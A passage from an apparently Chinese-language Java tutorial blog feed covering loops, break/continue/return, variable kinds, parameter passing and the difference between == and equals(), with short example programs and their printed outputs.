</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;</p>
<h5 id="do-while-语句"><a href="#do-while-语句" class="headerlink" title="do-while  语句  "></a><font color="#00B2EE" face="Comic sans MS">do-while  语句  </font></h5><p><font face="Comic sans MS">do-while语句的语法形式如下：<br>&emsp;&emsp;<font color="red">     do{<br>&emsp;&emsp;                        语句块<br>&emsp;&emsp;                         }while（布尔表达式）;<br></font><br><strong>说明：</strong>do：语句的关键字； 语句块：循环体，是一个语句，若是多个语句则应构成复合语句； 布尔表达式：循环条件。<br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[例3-8] Sum2.java 用do-while循环语句计算s=1+2+3+……100</span><br><span class="line">class Sum2&#123;</span><br><span class="line">	public static void main(String args[])&#123;</span><br><span class="line">		int i=1;         //循环次数，初值为１</span><br><span class="line">		int s=0;         //累加和s初值为0</span><br><span class="line">		<span class="keyword">do</span>&#123;              //开始无条件循环</span><br><span class="line">			s=s+i;       //s增加i</span><br><span class="line">			i++;         //循环次数加１</span><br><span class="line">		&#125;<span class="keyword">while</span>(i&lt;=100);  //循环总数100</span><br><span class="line">		System.out.println(<span class="string">&quot;s=&quot;</span>+s);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>&emsp;<br>&emsp;</p>
<h5 id="for-语句"><a href="#for-语句" class="headerlink" title="for 语句  "></a><font color="#00B2EE" face="Comic sans MS">for 语句  </font></h5><p><font face="Comic sans MS">for语句的语法形式为：<br>&emsp;&emsp;<font color="red">for（表达式1；表达式2；表达式3）<br>&emsp;&emsp;                  {   语句块<br>&emsp;&emsp;                  }<br></font><br><strong>说明：</strong>（表达式1；表达式2；表达式3）：循环条件； 语句块：循环体，是一个语句，若是多个语句则应构成复合语句。</p>
<p><font color="red"> <strong>for语句的执行过程如下：</strong></font><br>（1）按表达式1将初值赋给循环控制变量；<br>（2）按表达式2判断循环是否成立，如果成立则执行循环体，否则退出循环；<br>（3）执行一次循环后，执行表达式3修改控制变量。<br></font> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[例3-9] sum3.java 编程求S=12+22+…92 </span><br><span class="line">public class sum3&#123;</span><br><span class="line">	public static void main(String args[])&#123;</span><br><span class="line">		int s=0;</span><br><span class="line">		<span class="keyword">for</span>(int i=1;i&lt;=9;i++)</span><br><span class="line">		   s=s+i*i;</span><br><span class="line">		   System.out.println(<span class="string">&quot;s=&quot;</span>+s);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**for语句使用注意：**</font>    
1.  逗号语句分隔的语句系列,被看作一个语句，这样就可以在只能放一个语句的地方放任意多个语句，只须用逗
    号将它们分隔开。如： 
      for ( i=1,j=10;i < j;i++,j--)
      {    ……    }
2.  表达式1、表达式2及表达式3都可以为空语句(但分号不能省略) 如：
         for(  ;  ;  ) { … }     相当于while(true)   


<p><font color="red"><strong>循环的嵌套：</strong></font><br>一个循环体内又包含<font color="red">另一个完整的循环结构</font> ，称为循环的嵌套。内嵌的循环中还可以嵌套循环，这就是多重<br>循环。上述三种循环（while循环，do-while循环和for循环）语句之间可以相互嵌套使用。<br></font></td></tr></table></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[例3-10] 百鸡问题。</span><br><span class="line">      已知公鸡5元1只，母鸡3元一只，小鸡1元3只，要求用100元刚好买100只鸡，问有多少种采购方案。</span><br><span class="line"></span><br><span class="line">     分析: 设变量I、J、K分别代表公鸡数、母鸡数及小鸡数，则应满足下列一些条件:</span><br><span class="line">① I+J+K=100(只)，I,J,K0;</span><br><span class="line">② 5I+3J+K/3=100（元）;</span><br><span class="line">③ 若用100元全部买公鸡，最多只能买20只, 所以I≤20;若全部买母鸡最多只能买33只，所以J≤33; </span><br><span class="line">  而小鸡数目就是100-I-J;(简化计算)</span><br><span class="line">     根据以上分析，可编程如下：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class  Loop_Loop &#123;</span><br><span class="line">    public static void main(String args[]) &#123;</span><br><span class="line">      int I,J,K;</span><br><span class="line">      System.out.println(<span class="string">&quot; I    J    K &quot;</span>);</span><br><span class="line">      <span class="keyword">for</span>  (I=0;I&lt;=20;I++ )</span><br><span class="line">       &#123; <span class="keyword">for</span> ( J=0;J&lt;=33;J++)</span><br><span class="line">            &#123; K=100-I-J;                </span><br><span class="line">              <span class="keyword">if</span> (5*I+3*J+K/3.0==100)         //注意“K/3.0”</span><br><span class="line">              System.out.println(I+<span class="string">&quot;   &quot;</span>+J+<span class="string">&quot;   &quot;</span>+K);</span><br><span class="line">            &#125; </span><br><span class="line">       &#125;</span><br><span class="line">   &#125;  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>



<p>&emsp;<br>&emsp;</p>
<h4 id="2-3-跳转语句"><a href="#2-3-跳转语句" class="headerlink" title="2.3  跳转语句"></a><font color="#3CB371" face="Comic sans MS">2.3  跳转语句</font></h4><h5 id="break语句"><a href="#break语句" class="headerlink" title="break语句  "></a><font color="#00B2EE" face="Comic sans MS">break语句  </font></h5><p><font face="Comic sans MS"><font color="red"><strong>作用：</strong></font>  使程序的流程从一个语句块的内部跳转出来。<br>(1) 从switch语句的分支中跳出来<br>(2) 从循环体内跳出来<br></font> </p>
<p>对上述的(1)(2)举例如下：<font color="#00B2EE">**(1) break用于跳出switch语句**</font>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">switch(grade)</span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>: </span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>: </span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;C&#x27;</span>: System.out.println(<span class="string">&quot;及格\n &quot;</span>); <span class="built_in">break</span>;</span><br><span class="line"><span class="keyword">case</span> ‘D’: System.out.println(“不及格\n <span class="string">&quot;); break;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">习题1：分析该程序的输出结果</span><br><span class="line">int x=5;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">          switch(x%2)</span><br><span class="line">          &#123;</span><br><span class="line">                <span class="keyword">case</span> 1: x--;</span><br><span class="line">                            <span class="built_in">break</span>;</span><br><span class="line">                <span class="keyword">case</span> 0: x++;</span><br><span class="line">                            <span class="built_in">break</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           x--;</span><br><span class="line">           System.out.println(x);</span><br><span class="line">     &#125;<span class="keyword">while</span>(x&gt;0);</span><br><span class="line">运行结果：</span><br><span class="line">3</span><br><span class="line">1</span><br><span class="line">-1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">习题2：分析该程序的输出结果</span><br><span class="line">int a=5,b=6,i=0,j=0;</span><br><span class="line">switch(a)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">case</span> 5: switch(b)</span><br><span class="line">                    &#123;</span><br><span class="line">                          <span class="keyword">case</span> 5:i++;<span class="built_in">break</span>;</span><br><span class="line">                          <span class="keyword">case</span> 6:j++;<span class="built_in">break</span>;</span><br><span class="line">                          default:i++;j++;</span><br><span class="line">                     &#125;</span><br><span class="line">         <span class="keyword">case</span> 6: i++;j++;</span><br><span class="line">                     <span class="built_in">break</span>;</span><br><span class="line">         default: i++;j++;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(i+<span class="string">&quot;,&quot;</span>+j);</span><br><span class="line">运行结果：</span><br><span class="line">1,2</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font color="#00B2EE"><strong>(2) break用于跳出循环体</strong></font>  </p>
<p><strong>break可用于跳出for循环、while循环、do while循环。</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int sum=0;      </span><br><span class="line"><span class="keyword">for</span>(int i=1;i&lt;=100;i++)</span><br><span class="line">&#123;</span><br><span class="line">      sum=sum+i;</span><br><span class="line">      <span class="keyword">if</span>(i==50)<span class="built_in">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(sum);    //结果为1275</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;<br><font color="red"><strong>如果break在多重循环中，只退出break所在的那层循环到外层循环中。</strong></font>  </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">int sum=0;      </span><br><span class="line"><span class="keyword">for</span>(int i=1;i&lt;=100;i++)</span><br><span class="line">&#123;</span><br><span class="line">       sum=sum+i;</span><br><span class="line">       <span class="keyword">while</span>(i==50)&#123;i=100;<span class="built_in">break</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(sum);       //结果为1275</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;</p>
<h5 id="continue-语句"><a href="#continue-语句" class="headerlink" title="continue 语句 "></a><font color="#00B2EE" face="Comic sans MS">continue 语句 </font></h5><p><font face="Comic sans MS"><font color="red"><strong>作用：</strong></font>用来结束所在循环语句块的本次循环<br><font color="red"><strong>注意:</strong></font>continue语句只能在循环语句中使用。<br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[例3-11] ConDemo.java</span><br><span class="line">public class ConDemo&#123;</span><br><span class="line">public static void main(String args[])&#123;</span><br><span class="line">  int index=0;</span><br><span class="line">  <span class="keyword">while</span>(index&lt;=99)</span><br><span class="line"> &#123;</span><br><span class="line">	index+=10;</span><br><span class="line">           <span class="keyword">if</span>(index==40)  <span class="built_in">continue</span>; </span><br><span class="line">	System.out.println(<span class="string">&quot;   The index is &quot;</span>+index);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">程序运行结果：</span><br><span class="line">   The index is 10</span><br><span class="line">   The index is 20</span><br><span class="line">   The index is 30</span><br><span class="line">   The index is 50</span><br><span class="line">   The index is 60</span><br><span class="line">   The index is 70</span><br><span class="line">   The index is 80</span><br><span class="line">   The index is 90</span><br><span class="line">   The index is 100</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>循环体中使用break语句和continue语句的区别：</strong></font><br><font color="#00B2EE"><strong>Break语句</strong></font>  结束整个循环,不再判断执行循环的条件;<br><font color="#00B2EE"><strong>Continue语句</strong></font>只结束本次循环,而不是终止整个循环的执行。<br></font>  </p>
<p>&emsp;<br>&emsp;</p>
<h5 id="return-语句"><a href="#return-语句" class="headerlink" title="return 语句  "></a><font color="#00B2EE" face="Comic sans MS">return 语句  </font></h5><p><font face="Comic sans MS"><strong>格式：</strong>   <font color="red">return  表达式;</font><br><strong>用途：</strong><br>(1) 结束方法的运行，并返回一个值；<br>(2) 如果该方法没有返回值（void），则return后不能跟表达式。<br></font></p>
<blockquote>
<blockquote>
<p>例如：  return  0;<br>&emsp;&emsp;&emsp;   return;</p>
</blockquote>
</blockquote>
<p><strong>思考:分析以下程序运行结果</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1. </span><br><span class="line">public class ArithmeticOp&#123;</span><br><span class="line">    public static void main(String args[ ])&#123;</span><br><span class="line">       int a,b,c;</span><br><span class="line">       a=b=c=2;</span><br><span class="line">       a=++b - ++c;     //0 3 3</span><br><span class="line">       System.out.println（″a=″+a+″b=″+b+″c=″+c）;</span><br><span class="line">       a =b++ + c++;    //6 4 4</span><br><span class="line">       System.out.println（″a=″+a+″b=″+b+″c=″+c）;</span><br><span class="line">       a =b-- + c--;    //8 3 3</span><br><span class="line">       System.out.println（″a=″+a+″b=″+b+″c=″+c）;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">2.</span><br><span class="line">public class TestSwitch&#123;</span><br><span class="line">    public static void main(String args[ ])&#123;</span><br><span class="line">       int  x=1,y=2,i=0,j=0;</span><br><span class="line">       switch(x)&#123;</span><br><span class="line">          <span class="keyword">case</span> 1: switch(y)&#123;</span><br><span class="line">                   <span class="keyword">case</span> 1: i++;</span><br><span class="line">                   <span class="built_in">break</span>;</span><br><span class="line">                   <span class="keyword">case</span> 2: j++;</span><br><span class="line">                   <span class="built_in">break</span>;</span><br><span class="line">                   default:i++;</span><br><span class="line">                    j++;&#125;           //i=0 j=1</span><br><span class="line"></span><br><span class="line">          <span class="keyword">case</span> 2: i++;</span><br><span class="line">                  j++;              //i=1 j=2</span><br><span class="line">                  <span class="built_in">break</span>;</span><br><span class="line">          default:i++;</span><br><span class="line">                  j++;</span><br><span class="line">       &#125;</span><br><span class="line">      System.out.println(<span class="string">&quot;i=&quot;</span>+i);</span><br><span class="line">      System.out.println(<span class="string">&quot;j=&quot;</span>+j);</span><br><span class="line">    &#125;                              //i=1</span><br><span class="line">&#125;                                  //j=2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3.</span><br><span class="line">public class J_Test&#123;</span><br><span class="line">  static boolean mb_fun(char c)</span><br><span class="line">  &#123;    System.out.print(c);</span><br><span class="line">       <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  public  static void main(String args[])&#123;</span><br><span class="line">       int i=0;</span><br><span class="line">       <span class="keyword">for</span>(mb_fun(‘A’);mb_fun(‘B’)&amp;&amp;(i&lt;2);mb_fun(‘C’))</span><br><span class="line">       &#123;   i++;</span><br><span class="line">           mb_fun(‘D’);</span><br><span class="line">       &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;     //结果： A B D C B D C B</span><br></pre></td></tr></table></figure>

<hr>
<hr>
<p>&emsp;<br>&emsp;<br>&emsp;<br>&emsp;</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java学习</tag>
        <tag>Java语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Java变量及其传递、内部类(4.9-4.10)</title>
    <url>/post/Java-Variable-InnerClass6/</url>
    <content><![CDATA[<p>&emsp;<br>&emsp;</p>
<center><font color="#3CB371" face="Comic sans MS" size=5>变量及其传递 & 内部类</font></center>

<p>&emsp;</p>
<h3 id="一、-Java变量及其传递"><a href="#一、-Java变量及其传递" class="headerlink" title="一、 Java变量及其传递"></a><font color="#FF6347" face="Comic sans MS">一、 Java变量及其传递</font></h3><h4 id="1-1-基本数据变量与引用型变量"><a href="#1-1-基本数据变量与引用型变量" class="headerlink" title="1.1  基本数据变量与引用型变量"></a><font color="#20B2AA" face="Comic sans MS">1.1  基本数据变量与引用型变量</font></h4><p><font face="Comic sans MS"><strong>1.  📒Java变量:</strong><br>&emsp;<font color="red"><strong>(1). 基本型变量(8种)</strong></font><br>&emsp;&emsp; <strong>char,byte,short,int,long,float,double,boolean</strong><br>&emsp;<font color="red"><strong>(2). 引用型变量：</strong></font><strong>对象,接口,数组</strong></font>            </p>
<p><img data-src="https://i.loli.net/2018/12/27/5c24f23dc321f.png" alt="T2.png"><br><img data-src="https://i.loli.net/2018/12/27/5c24f4379eed2.png" alt="N.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">举例：</span><br><span class="line">    public class MyDate&#123;</span><br><span class="line">	private int day=12;</span><br><span class="line">	private int month=6;</span><br><span class="line">	private int year=1900;</span><br><span class="line">	public MyDate(int y,int m,int d)&#123;</span><br><span class="line">		year=y;</span><br><span class="line">		month=m;</span><br><span class="line">		day=d;&#125;</span><br><span class="line">          void addYear()</span><br><span class="line">	&#123;   year++;&#125;</span><br><span class="line">         public void <span class="function"><span class="title">display</span></span>()&#123;</span><br><span class="line">	System.out.println(year+<span class="string">&quot;-&quot;</span>+month</span><br><span class="line">             +<span class="string">&quot;-&quot;</span>+day);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">       MyDate m,n;</span><br><span class="line">       m=new MyDate(2003,9,22);</span><br><span class="line">       n=m;     <span class="string">&quot;//n和m指向同一个地址&quot;</span></span><br><span class="line">       n.addYear();</span><br><span class="line">       m.display();</span><br><span class="line">       n.display();</span><br><span class="line">       System.out.println(m.toString());</span><br><span class="line">       System.out.println(n.toString());	</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">      /*运行结果</span><br><span class="line">       2004-9-22</span><br><span class="line">       2004-9-22</span><br><span class="line">       MyDate@11a698a</span><br><span class="line">       MyDate@11a698a</span><br><span class="line">      */</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;</p>
<h4 id="1-2-成员变量与局部变量"><a href="#1-2-成员变量与局部变量" class="headerlink" title="1.2  成员变量与局部变量"></a><font color="#20B2AA" face="Comic sans MS">1.2  成员变量与局部变量</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**成员变量与局部变量有没有区别?**</font>
  成员变量若为static的称为类变量，否则称为成员变量，而局部变量是在方法体内的变量。
 (1) 📒从语法形式上看，成员变量是属于类或接口的，而局部变量是在方法中定义的变量或方法的参变量；
 成员变量可以被public，private，static等修饰，而局部变量则不能被访问控制符及static修饰；成员
 变量及局部变量都可以被final修饰。
(2) 📒从变量在内存中的存储方式看，成员变量是对象的一部分，而对象是存在于堆中的，而局部变量是
     存在于栈中的。
(3) 📒从变量在内存中的存在时间上看，成员变量是对象的一部分，它随着对象的创建而存在，而局部变
     量随着方法的调用而产生，随着方法调用结束而自动消失。
(4) 📒成员变量如果没有赋初值，则会自动以该类型的默认值（0,false,null等）赋值；而局部变量则不会
     自动赋值，必须显示地赋值后才能使用。 
</font></td></tr></table>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">class A&#123;</span><br><span class="line">         int a;</span><br><span class="line">         void <span class="function"><span class="title">m</span></span>()&#123;</span><br><span class="line">            int b;</span><br><span class="line">            System.out.println(a);  //合法的，a的值为0</span><br><span class="line">            System.out.println(b);  //不合法，编译不通过</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;</p>
<h4 id="1-3-变量的传递"><a href="#1-3-变量的传递" class="headerlink" title="1.3  变量的传递"></a><font color="#20B2AA" face="Comic sans MS">1.3  变量的传递</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. 📒按值传递:</strong></font>当将一个参数传递给一个函数时，函数接收的是原始值的一个副本。因此，如果函数修改了该参数，仅改变副本，而原始值保持不变。(传递8种基本型变量)<br><font color="red"><strong>2. 📒按引用传递:</strong></font>当将一个参数传递给一个函数时，函数接收的原始值的内存地址，而不是值的副本，因此，如果修改了该参数，调用代码中的原始值也随之改变。(传递对象,接口,数组)<br><font color="#00B2EE"><em>Java中的参数传递比C++简单,按值传递所有参数,制作所有参数的副本,而不管它们的类型。</em></font><br></font></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例1：</span><br><span class="line">class TestTransOfValue</span><br><span class="line">&#123;</span><br><span class="line">  public static void main(String args[])</span><br><span class="line">  &#123;</span><br><span class="line">    int val;</span><br><span class="line">    StringBuffer sb1, sb2;</span><br><span class="line">    val = 10;</span><br><span class="line">    sb1 = new StringBuffer(<span class="string">&quot;apples&quot;</span>);</span><br><span class="line">    sb2 = new StringBuffer(<span class="string">&quot;pears&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;val is &quot;</span> + val);</span><br><span class="line">    System.out.println(<span class="string">&quot;sb1 is &quot;</span> + sb1);</span><br><span class="line">    System.out.println(<span class="string">&quot;sb2 is &quot;</span> + sb2);</span><br><span class="line">    System.out.println(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;calling modify&quot;</span>);</span><br><span class="line">    //按值传递所有参数</span><br><span class="line">    modify(val, sb1, sb2);</span><br><span class="line">    System.out.println(<span class="string">&quot;returned from modify&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;val is &quot;</span> + val);</span><br><span class="line">    System.out.println(<span class="string">&quot;sb1 is &quot;</span> + sb1);</span><br><span class="line">    System.out.println(<span class="string">&quot;sb2 is &quot;</span> + sb2);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">public static void modify(int a, StringBuffer r1,</span><br><span class="line">                         StringBuffer r2)</span><br><span class="line">  &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;in modify...&quot;</span>);</span><br><span class="line">    //在方法中修改基本类型变量的值</span><br><span class="line">    a = 0;  </span><br><span class="line">    //在方法中修改对象引用值的副本</span><br><span class="line">    r1 = null;  //1</span><br><span class="line">    //在方法中修改副本的对象实体值</span><br><span class="line">    r2.append(<span class="string">&quot; taste good&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;a is &quot;</span> + a);</span><br><span class="line">    System.out.println(<span class="string">&quot;r1 is &quot;</span> + r1);</span><br><span class="line">    System.out.println(<span class="string">&quot;r2 is &quot;</span> + r2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">运行后输出：</span><br><span class="line">val is 10</span><br><span class="line">sb1 is apples</span><br><span class="line">sb2 is pears</span><br><span class="line">calling modify <span class="keyword">in</span> modify...</span><br><span class="line">a is 0</span><br><span class="line">r1 is null</span><br><span class="line">r2 is pears taste good </span><br><span class="line">returned from modify</span><br><span class="line">val is 10</span><br><span class="line">sb1 is apples</span><br><span class="line">sb2 is pears taste good </span><br><span class="line">/*关于这里的sb1和r1：</span><br><span class="line">当参数传到modify后，r1和sb1指向同一个地址，若改变了r1指向的地址，并不会更改sb1指向的地址。这个时候就</span><br><span class="line">相当于看作两个指针了。</span><br><span class="line">关于sb2和r2：</span><br><span class="line">sb2和r2指向同一个地址，这个地址指向的值(实体值)被改变了，则结束后sb2和r2的实体值也就相应的改变了。</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
<p><img data-src="https://i.loli.net/2018/12/28/5c2500f374fbd.png" alt="FX.png"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">例2：</span><br><span class="line">class Swap</span><br><span class="line">&#123; </span><br><span class="line"> public static void main(String args[])</span><br><span class="line">  &#123;</span><br><span class="line">    Integer a, b;</span><br><span class="line">    a = new Integer(10);</span><br><span class="line">    b = new Integer(50);</span><br><span class="line">    System.out.println(<span class="string">&quot;before swap...&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;a is &quot;</span> + a);</span><br><span class="line">    System.out.println(<span class="string">&quot;b is &quot;</span> + b);</span><br><span class="line">    swap(a, b);</span><br><span class="line">    System.out.println(<span class="string">&quot;after swap...&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;a is &quot;</span> + a);</span><br><span class="line">    System.out.println(<span class="string">&quot;b is &quot;</span> + b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> public static void swap(Integer a, Integer b)</span><br><span class="line">  &#123;</span><br><span class="line">    Integer temp = a;</span><br><span class="line">    a = b;</span><br><span class="line">    b = temp;</span><br><span class="line">    System.out.println(<span class="string">&quot;in swap...&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;a is &quot;</span> + a);</span><br><span class="line">    System.out.println(<span class="string">&quot;b is &quot;</span> + b);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">运行后输出：</span><br><span class="line">before swap...</span><br><span class="line">a is 10</span><br><span class="line">b is 50</span><br><span class="line"><span class="keyword">in</span> swap…</span><br><span class="line">a is 50</span><br><span class="line">b is 10</span><br><span class="line">after swap...</span><br><span class="line">a is 10</span><br><span class="line">b is 50 </span><br><span class="line">*/</span><br></pre></td></tr></table></figure>

<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**参数传递总结：**</font>
 (1) Java按值传递所有参数,制作所有参数的副本,而不管它们的类型
 (2) 对于基本类型的变量形参修改了并不能反映到函数外面的实参
 (3) 对于引用类型的变量，在形参中修改了对象实体值可以反映到实参，在形参中修改了对象引用值，
     不能反映到实参
</font></td></tr></table>


<p>&emsp;<br>&emsp;</p>
<h4 id="1-4-引用型变量的实体值、引用值比较"><a href="#1-4-引用型变量的实体值、引用值比较" class="headerlink" title="1.4  引用型变量的实体值、引用值比较"></a><font color="#20B2AA" face="Comic sans MS">1.4  引用型变量的实体值、引用值比较</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. 📒参数传递总结：</strong></font><br> (1) 比较基本类型的数据: ==和!=<br> (2) 如果要比较引用型变量是否相同,可以直接用==和!=吗?<font color="red">  <strong>答：不能</strong></p>
<p><strong>==和!=用来比较引用型变量时（只能比较引用值（地址）是不是相等）,只能判断运算符两边引用的是不是同一个对象,即对象的地址值（或对象引用值）！！！！！</strong></font><br><font color="#00B2EE"><strong>如何比较两个对象的内容(对象实体值)是否相同?<br>用equls()方法：</strong></font><br></font></p>
<table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS"><font color="red">**2. 📒引用型变量比较总结：**</font>
 (1) 比较两个变量是否同一个对象（即对象引用值是否相同），用==和!=
 (2) 比较两个变量的内容是否相同用equals方法
 (3) **自己定义的类如果要支持equals方法必须重写从Object类继承来的equals方法(比如前面的String类
 是java自己的类就不需要重写equals，但是Employee类就是自己定义的类则需要重写equals)**

<p><strong>Object类中的equals方法：</strong><br> <em>public boolean equals(Object obj){<br>   return (this==obj);<br> }</em><br></font></td></tr></table></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">equals示例1:</span><br><span class="line">class EqualsTest&#123;</span><br><span class="line">  public static void main(String[] arguments)</span><br><span class="line">  &#123;</span><br><span class="line">     String str1,str2;</span><br><span class="line">     str1=<span class="string">&quot;Free the bound periodicals.&quot;</span>;</span><br><span class="line">     str2=str1;</span><br><span class="line">     System.out.println(<span class="string">&quot;String1: &quot;</span>+str1);</span><br><span class="line">     System.out.println(<span class="string">&quot;String2: &quot;</span>+str2);</span><br><span class="line">     System.out.println(<span class="string">&quot;Same object? &quot;</span>+(str1==str2));      //<span class="literal">true</span></span><br><span class="line">     str2=new String(str1);</span><br><span class="line">     System.out.println(<span class="string">&quot;String1: &quot;</span>+str1);</span><br><span class="line">     System.out.println(<span class="string">&quot;String2: &quot;</span>+str2);</span><br><span class="line">     System.out.println(<span class="string">&quot;Same object? &quot;</span>+(str1==str2));      //<span class="literal">false</span></span><br><span class="line">     System.out.println(<span class="string">&quot;Same value? &quot;</span>+str1.equals(str2));  //<span class="literal">true</span></span><br><span class="line">     String str3,str4;</span><br><span class="line">     str3=<span class="string">&quot;busy&quot;</span>;</span><br><span class="line">     str4=<span class="string">&quot;busy&quot;</span>; //str4=new String(<span class="string">&quot;busy&quot;</span>)或str4=new String(str3) </span><br><span class="line">     System.out.println(<span class="string">&quot;String3: &quot;</span>+str3);</span><br><span class="line">     System.out.println(<span class="string">&quot;String4: &quot;</span>+str4);</span><br><span class="line">     System.out.println(<span class="string">&quot;Same object? &quot;</span>+(str3==str4));       //<span class="literal">true</span></span><br><span class="line">     System.out.println(<span class="string">&quot;Same value? &quot;</span>+str3.equals(str4));   //<span class="literal">true</span> </span><br><span class="line">     String str5,str6;</span><br><span class="line">     str5=<span class="string">&quot;str5busy&quot;</span>;</span><br><span class="line">     str6=<span class="string">&quot;str6busy&quot;</span>;</span><br><span class="line">     System.out.println(<span class="string">&quot;String5: &quot;</span>+str5);</span><br><span class="line">     System.out.println(<span class="string">&quot;String6: &quot;</span>+str6);</span><br><span class="line">     System.out.println(<span class="string">&quot;Same object? &quot;</span>+(str5==str6));      //<span class="literal">false</span></span><br><span class="line">     System.out.println(<span class="string">&quot;Same value? &quot;</span>+str5.equals(str6));  //<span class="literal">false</span> 	</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">equals示例2：</span><br><span class="line">import java.util.*;</span><br><span class="line">public class EqualsTest &#123;</span><br><span class="line">     public <span class="function"><span class="title">EqualsTest</span></span>() &#123;    &#125;    </span><br><span class="line">     public static void main(String[] args)&#123;</span><br><span class="line">     Employee alice1=new Employee(<span class="string">&quot;Alice&quot;</span>,75000,1987,12,15);</span><br><span class="line">     Employee alice2=alice1;</span><br><span class="line">     Employee alice3=new Employee(<span class="string">&quot;Alice&quot;</span>,75000,1987,12,15);</span><br><span class="line">     Employee bob=new Employee(<span class="string">&quot;Bob&quot;</span>,50000,1989,10,1);</span><br><span class="line">     System.out.println(<span class="string">&quot;alice1==alice2: &quot;</span>+(alice1==alice2));    //<span class="literal">true</span></span><br><span class="line">     System.out.println(<span class="string">&quot;alice1==alice3: &quot;</span>+(alice1==alice3));    //<span class="literal">false</span> </span><br><span class="line">     System.out.println(<span class="string">&quot;alice1.equals(alice3): &quot;</span>+alice1.equals(alice3));  //<span class="literal">true</span></span><br><span class="line">     System.out.println(<span class="string">&quot;alice1.equals(bob): &quot;</span>+alice1.equals(bob));   //<span class="literal">false</span> </span><br><span class="line">     System.out.println(<span class="string">&quot;bob.toString(): &quot;</span>+bob);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Employee&#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private double salary;</span><br><span class="line">    private Date hireDay; </span><br><span class="line">    public Employee(String n,double s,int year,int month,int day)&#123;</span><br><span class="line">            name=n;</span><br><span class="line">            salary=s</span><br><span class="line">        hireDay=new Date(year,month,day);</span><br><span class="line">    &#125;</span><br><span class="line">    public String <span class="function"><span class="title">getName</span></span>()&#123;     <span class="built_in">return</span> name;     &#125;</span><br><span class="line">    public double <span class="function"><span class="title">getSalary</span></span>()&#123;   <span 